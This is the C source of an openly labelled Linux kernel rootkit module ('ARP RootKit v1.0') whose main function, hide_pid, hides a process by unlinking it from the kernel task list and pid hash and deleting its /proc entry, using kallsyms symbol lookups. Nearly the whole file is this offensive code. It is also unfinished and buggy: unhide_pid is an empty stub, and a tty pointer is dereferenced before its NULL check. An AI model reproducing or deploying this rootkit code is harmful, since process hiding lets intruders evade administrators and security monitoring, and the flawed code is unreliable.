/*
 * ARP RootKit v1.0, a simple rootkit for the Linux Kernel.
 * 
 * Copyright 2018 Abel Romero Pérez aka D1W0U <abel@abelromero.com>
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>. 
 */

#include <linux/namei.h>
#include <linux/proc_fs.h>
#include <linux/pid_namespace.h>
#include <linux/kallsyms.h>
#include <linux/rculist.h>
#include <linux/hash.h>
#include <linux/sched/signal.h>
#include <linux/module.h>       /* Needed by all modules */
#include <linux/kernel.h>       /* Needed for KERN_INFO */
#include <linux/init.h>         /* Needed for the macros */
#include <linux/tty.h>          /* For the tty declarations */
#include <linux/version.h> /* For LINUX_VERSION_CODE */

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Abel Romero Pérez aka D1W0U <abel@abelromero.com>");
MODULE_DESCRIPTION("A simple Linux Kernel Module RootKit");
MODULE_SUPPORTED_DEVICE("testdevice");


#define pid_hashfn(nr, ns)  \
    hash_long((unsigned long)nr + (unsigned long)ns, pidhash_shift)
struct hlist_head *pid_hash = NULL;
unsigned int pidhash_shift = 0;

#define PREFIX_MAX      32
#define LOG_LINE_MAX        (1024 - PREFIX_MAX)

int hide_pid(pid_t pid);
int unhide_pid(pid_t pid);
void pinfo(const char *fmt, ...);
void vpinfo(const char *fmt, va_list args);
static int __init init_rootkit(void)
{
    //pinfo("Hello world\n");

	pid_hash = (struct hlist_head *) *((struct hlist_head **) kallsyms_lookup_name("pid_hash"));
	pidhash_shift = (unsigned int) *((unsigned int *) kallsyms_lookup_name("pidhash_shift"));

	if (pid_hash == NULL || pidhash_shift == 0) {
		pinfo("ERROR: pid_hash = %p, pidhash_shift = %d", pid_hash, pidhash_shift);
		return -1;
	}

	pinfo("pid_hash = %p, pidhash_shift = %d\n", pid_hash, pidhash_shift);

	hide_pid(10);

	return 0;
}

static void __exit cleanup_rootkit(void)
{
    //pinfo("Goodbye, ARP rootkit\n");
}

// from https://github.com/bashrc/LKMPG/blob/master/4.14.8/examples/print_string.c
// from linux-source/kernel/printk/printk.c
void pinfo(const char *fmt, ...) {
    va_list args;

    va_start(args, fmt);
    vpinfo(fmt, args);
    va_end(args);
}

void vpinfo(const char *fmt, va_list args) {
    struct tty_struct *my_tty;
    const struct tty_operations *ttyops;
    static char textbuf[LOG_LINE_MAX];
    char *str = textbuf;
    size_t str_len = 0;

    /*
     * tty struct went into signal struct in 2.6.6
     */
#if ( LINUX_VERSION_CODE <= KERNEL_VERSION(2,6,5) )
    /*
     * The tty for the current task
     */
    my_tty = current->tty;
#else
    /*
     * The tty for the current task, for 2.6.6+ kernels
     */
    my_tty = get_current_tty();
#endif
    ttyops = my_tty->driver->ops;

    /*
     * If my_tty is NULL, the current task has no tty you can print to
     * (ie, if it's a daemon).  If so, there's nothing we can do.
     */
    if (my_tty != NULL) {

		str_len = vscnprintf(str, sizeof(textbuf), fmt, args);

        /*
         * my_tty->driver is a struct which holds the tty's functions,
         * one of which (write) is used to write strings to the tty.
         * It can be used to take a string either from the user's or
         * kernel's memory segment.
         *
         * The function's 1st parameter is the tty to write to,
         * because the same function would normally be used for all
         * tty's of a certain type.  The 2nd parameter controls
         * whether the function receives a string from kernel
         * memory (false, 0) or from user memory (true, non zero).
         * BTW: this param has been removed in Kernels > 2.6.9
         * The (2nd) 3rd parameter is a pointer to a string.
         * The (3rd) 4th parameter is the length of the string.
         *
         * As you will see below, sometimes it's necessary to use
         * preprocessor stuff to create code that works for different
         * kernel versions. The (naive) approach we've taken here
         * does not scale well. The right way to deal with this
         * is described in section 2 of
         * linux/Documentation/SubmittingPatches
         */
        (ttyops->write) (my_tty,      /* The tty itself */
#if ( LINUX_VERSION_CODE <= KERNEL_VERSION(2,6,9) )
                         0,   /* Don't take the string
                                 from user space        */
#endif
                    	 str, /* String                 */
                         str_len);        /* Length */

        /*
         * ttys were originally hardware devices, which (usually)
         * strictly followed the ASCII standard.  In ASCII, to move to
         * a new line you need two characters, a carriage return and a
         * line feed.  On Unix, the ASCII line feed is used for both
         * purposes - so we can't just use \n, because it wouldn't have
         * a carriage return and the next line will start at the
         * column right after the line feed.
         *
         * This is why text files are different between Unix and
         * MS Windows.  In CP/M and derivatives, like MS-DOS and
         * MS Windows, the ASCII standard was strictly adhered to,
         * and therefore a newline requirs both a LF and a CR.
         */

#if ( LINUX_VERSION_CODE <= KERNEL_VERSION(2,6,9) )
        (ttyops->write) (my_tty, 0, "\015\012", 2);
#else
        (ttyops->write) (my_tty, "\015\012", 2);
#endif
    }
}

int hide_pid(pid_t nr) {
	struct pid_namespace *ns = task_active_pid_ns(current);
	struct upid *pnr;
	//printk("ns %p\n", ns);
	//printk("nr %d\n", nr);
	struct hlist_head *head;
	struct hlist_node *node;
	head = &pid_hash[pid_hashfn(nr, ns)];
	node = hlist_first_rcu(head);
	pnr = hlist_entry_safe(rcu_dereference_raw(node), typeof(*(pnr)), pid_chain);
	if (pnr) {
		//printk("%d\n", pnr->nr);
		if (pnr->nr == nr && pnr->ns == ns) {
			pinfo("found pid %d", nr);
			struct pid *pid = container_of(pnr, struct pid, numbers[ns->level]);
			struct task_struct *task = get_pid_task(pid, PIDTYPE_PID);
			if (task != NULL) {
				//printk("task = %p\n", task);
				struct list_head *task_next, *task_prev;
				task_prev = task->tasks.next->prev;
				task_next = task->tasks.prev->next;
				task->tasks.next->prev = task->tasks.prev;
				task->tasks.prev->next = task->tasks.next;
				hlist_del_rcu(node);
				char path_name[50];
				snprintf(path_name, sizeof(path_name), "/proc/%d", nr);
				struct path path;
				kern_path(path_name, LOOKUP_FOLLOW, &path);
				d_delete(path.dentry);
				d_rehash(path.dentry);
				hlist_add_head_rcu(node, &pid_hash[pid_hashfn(nr, ns)]);
				task->tasks.next->prev = task_prev;
				task->tasks.prev->next = task_next;

				pinfo("find_vpid %p", find_vpid(nr));
				
				pinfo("Ok");
		
				return 0;
			} else {
				pinfo("task_struct for PID %d not found", nr);
			}
		} else {
			pinfo("Unknown error 1");
		}
	} else {
		pinfo("PID not found.");
	}

	return -1;
}

int unhide_pid(pid_t pid) {
	
}

module_init(init_rootkit);
module_exit(cleanup_rootkit);
